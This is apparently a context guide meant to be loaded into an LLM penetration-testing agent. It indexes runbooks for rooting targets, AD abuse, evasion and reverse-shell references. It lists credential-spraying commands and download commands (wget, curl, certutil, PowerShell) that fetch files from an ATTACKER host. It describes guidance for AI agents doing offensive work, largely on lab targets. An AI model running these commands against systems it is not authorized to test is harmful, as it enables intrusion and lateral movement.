# LLM Hacking Context Guide

> This file provides structured context for any LLM (open-source or proprietary) doing penetration testing.
> Load this as initial context to compensate for smaller model reasoning limitations.

## How to Use This Knowledge Base

When given a target, follow this decision tree:

### -1. Check for a RUNBOOK that matches your exact target (highest priority)
**A runbook is a copy-paste, end-to-end script** with every command literal
and every expected output documented. If your target matches one, use it
literally instead of reasoning from scratch.

- `playbooks/runbooks/wing-ftp-rooted.md` — Wing FTP Server 7.4.3 → root
  (CVE-2025-47812 + CVE-2025-4517). Validated on wingdata.htb.
- `playbooks/runbooks/linux-foothold-to-root.md` — ANY Linux shell → root,
  via the 7 most common privesc paths (sudo, SUID, capabilities, cron,
  writable paths, kernel exploits, container escape).
- `playbooks/runbooks/README.md` — full index, including how to author new ones.

If you finished an engagement, **add a runbook for the next operator**.

### 0. Match the target to an ARCHETYPE first (most specific, most useful)
If no runbook matches, check `playbooks/archetypes/README.md`. If your
target matches one of the archetypes, that file is faster, more concrete, and
lists the specific CVEs and pitfalls for that target type.

Archetypes:
- AI/LLM platform (Flowise, n8n, AnythingLLM, Dify, etc.) → `playbooks/archetypes/ai-orchestration.md`
- Custom FTP / file server (Wing FTP, ProFTPD, etc.) → `playbooks/archetypes/custom-ftp-or-file-server.md`
- Generic webapp with login (no obvious framework) → `playbooks/archetypes/webapp-with-login.md`
- CMS + plugins (WordPress, Joomla, Drupal) → `playbooks/archetypes/cms-and-plugins.md`
- AD/Windows target → `playbooks/archetypes/ad-windows-target.md`
- Linux host with SNMP → `playbooks/archetypes/linux-snmp-host.md`
- DevOps tool (Jenkins, GitLab, Jira, etc.) → `playbooks/archetypes/devops-tools.md`
- API-only target (Swagger, GraphQL, JSON) → `playbooks/archetypes/api-only-target.md`

### 0b. MANDATORY helper scripts
- `scripts/timebox.sh` — wrap **every** brute-force/dir-bust command. Default 90s budget for hydra.
- `scripts/source-dive.sh` — if the target runs an open-source app and seems to require auth, RUN THIS before brute force. The auth bypass is in the source.
- `scripts/walkthrough-search.sh` — for retired/public boxes, gives technique fingerprints (NO spoilers).
- `scripts/new-target.sh` — ALWAYS run first to create `reports/<target>/` structure.

### 0c. Hash cracking shortcut
If you have a hash and rockyou exhausts on default mode → you have the
WRONG MODE, not a weak password. Read `knowledge-base/creative-pivots.md`
Section E0 for the algorithm → mode lookup table. Find the salt in app
config FIRST, then read the login source code to confirm the algorithm.

### 0d. Known CVEs we've used
`knowledge-base/cve-to-exploit-cache.md` lists CVEs we've successfully
exploited, with exploit-db IDs, local paths, and patches needed.

### 1. What type of engagement? (fallback if no archetype fits)
- **Web application** → Load `playbooks/web-app-pentest.md` + `checklists/owasp-top10.md`
- **Network/infrastructure** → Load `playbooks/network-pentest.md` + `checklists/enumeration-checklist.md`
- **Active Directory** → Load `checklists/ad-attack-checklist.md`
- **API testing** → Load `playbooks/api-pentest.md`
- **Cloud infrastructure** → Load `playbooks/cloud-pentest.md`
- **Wireless** → Load `playbooks/wireless-pentest.md`
- **Privilege escalation** → Load `playbooks/privilege-escalation.md`

### 1b. Did you find a custom internal tool or support utility?
- **Custom binary / admin tool / support tool / backup client** → Load `playbooks/internal-tool-reversing.md`
- If the target is AD and the tool appears to talk to LDAP, SMB, WinRM, or internal APIs, prioritize reversing/triage before brute force

### 1c. Are you working from a BloodHound edge or AD ACL path?
- **Need to translate BloodHound edges into concrete action** → Load `checklists/bloodhound-edge-to-action.md`
- **Need exact AD abuse syntax** → Load `tools/ad-abuse-commands.md`
- **Need to execute RBCD path** → Load `playbooks/ad-rbcd-privesc.md`
- **Already have a domain user and need to convert it into DA or high privilege** → Load `playbooks/ad-foothold-to-domain-admin.md`
- **Need shadow credentials or AD CS abuse** → Load `playbooks/adcs-and-shadow-creds.md`

### 2. What phase are you in?
1. **Recon** → Gather info before touching the target
2. **Enumeration** → Actively probe the target for services/versions
3. **Vulnerability Assessment** → Identify weaknesses
4. **Exploitation** → Gain access
5. **Post-Exploitation** → Escalate, pivot, persist
6. **Reporting** → Document everything

### 3. What tool do you need?
→ Check `knowledge-base/tools/kali-essentials.md` for the right tool and exact command syntax.

### 4. Need a reverse shell?
→ Check `knowledge-base/checklists/reverse-shells.md` for every language and method.

### 5. Need to map to MITRE ATT&CK?
→ Check `knowledge-base/mitre-attack/enterprise-tactics.md` for tactic→technique→tool mapping.
→ For deep dives, check `knowledge-base/mitre-attack/techniques/`:
  - `web-exploitation.md` — Full web app attack methodology (SQLi, XSS, SSRF, LFI, upload, etc.)
  - `credential-access-ad.md` — AD attacks from zero to Domain Admin
  - `lateral-movement-deep.md` — All remote execution methods + tunneling/pivoting
  - `persistence-deep.md` — Linux, Windows, AD, and web persistence techniques
  - `defense-evasion-deep.md` — AV/EDR bypass, AMSI, LOLBins, log evasion
  - `reconnaissance-deep.md` — Passive + active recon, OSINT, scanning
  - `c2-tunneling.md` — C2 frameworks, DNS/ICMP/SSH/chisel/ligolo tunneling
  - `cloud-attacks.md` — AWS, Azure, GCP attack methodology

## Attack Methodology (Universal)

```
┌─────────────────────────────────────────────────────────┐
│  1. RECONNAISSANCE                                       │
│     Passive: OSINT, DNS, subdomains, Google dorks       │
│     Active: Port scan, service detection                 │
├─────────────────────────────────────────────────────────┤
│  2. ENUMERATION                                          │
│     Per-port checklist, version detection                │
│     Web: dirs, vhosts, APIs, CMS                        │
│     AD: users, groups, shares, policies                 │
├─────────────────────────────────────────────────────────┤
│  3. VULNERABILITY IDENTIFICATION                         │
│     searchsploit, nuclei, nikto, manual testing         │
│     Map to OWASP Top 10 / MITRE ATT&CK                 │
├─────────────────────────────────────────────────────────┤
│  4. EXPLOITATION                                         │
│     Metasploit, manual exploits, SQLi, RCE              │
│     Get initial foothold (reverse shell / creds)        │
├─────────────────────────────────────────────────────────┤
│  5. POST-EXPLOITATION                                    │
│     Privilege escalation (linpeas/winpeas)              │
│     Credential harvesting (mimikatz/secretsdump)        │
│     Lateral movement (psexec/wmiexec/evil-winrm)       │
│     Persistence (if authorized)                         │
├─────────────────────────────────────────────────────────┤
│  6. REPORTING                                            │
│     Use templates/attack-report-template.md             │
│     Document EVERYTHING with reproducibility            │
└─────────────────────────────────────────────────────────┘
```

## Critical Decision Points

### "I found an open port but don't know what to do"
→ Go to `checklists/enumeration-checklist.md`, find the port, follow every step.

### "I found a service version"
→ Run: `searchsploit SERVICE VERSION`
→ Run: `nuclei -u http://TARGET -t cves/`
→ Check: `msfconsole -q -x "search SERVICE"`

### "I got credentials but can't use them"
→ Try every protocol: SMB, WinRM, RDP, SSH, PSExec, WMIExec
→ `crackmapexec smb TARGET -u USER -p PASS`
→ `crackmapexec winrm TARGET -u USER -p PASS`
→ `evil-winrm -i TARGET -u USER -p PASS`
→ `impacket-psexec DOMAIN/USER:PASS@TARGET`
→ If WinRM auth works but the shell client is unstable, switch to `wmiexec.py` or `psexec.py`

### "BloodHound shows GenericAll / WriteDacl / AddKeyCredentialLink and I don't know what to do"
→ Load `checklists/bloodhound-edge-to-action.md`
→ Load `tools/ad-abuse-commands.md`
→ If the edge lands on a computer object, especially `DC$`, evaluate RBCD first

### "I'm stuck and starting to loop"
→ Load `checklists/stuck-reasoning.md`
→ Classify the problem before running more tools at random

### "I already have enough, but I keep enumerating"
→ Load `checklists/when-to-stop-enumerating.md`
→ If a short exploit path exists, stop broad enum and execute it

### "The path seems right but the tooling keeps failing"
→ Load `checklists/operator-fallbacks.md`
→ Separate dead paths from broken tools, DNS/Kerberos issues, and syntax problems

### "This is clearly an HTB box / lab / CTF-style target"
→ Load `checklists/ctf-lab-decision-rules.md`
→ Favor the shortest credible exploit chain over exhaustive broad enum

### "I have a shell but I'm low-privileged"
→ Go to `playbooks/privilege-escalation.md`
→ Run linpeas (Linux) or winpeas (Windows)
→ Check sudo -l, SUID, capabilities, cron, writable files

### "I need to move to another machine"
→ Check `knowledge-base/mitre-attack/enterprise-tactics.md` → Lateral Movement
→ Try credentials on other hosts
→ Set up tunneling if needed (chisel, SSH, ligolo-ng)

### "I need to transfer files to the target"
```bash
# Attacker serves files:
python3 -m http.server 8080

# Target downloads:
# Linux: wget http://ATTACKER:8080/file -O /tmp/file
#        curl http://ATTACKER:8080/file -o /tmp/file
# Windows: certutil -urlcache -f http://ATTACKER:8080/file C:\temp\file
#          powershell (New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file','C:\temp\file')
#          powershell iwr -uri http://ATTACKER:8080/file -outfile C:\temp\file

# SMB share:
impacket-smbserver share /path -smb2support
# Windows: copy \\ATTACKER\share\file C:\temp\file
```

## Report Template Location
→ `templates/attack-report-template.md`

## Rules (from Raquel)
→ `AGENTS.md` — Always follow these. Pass to all subagents.
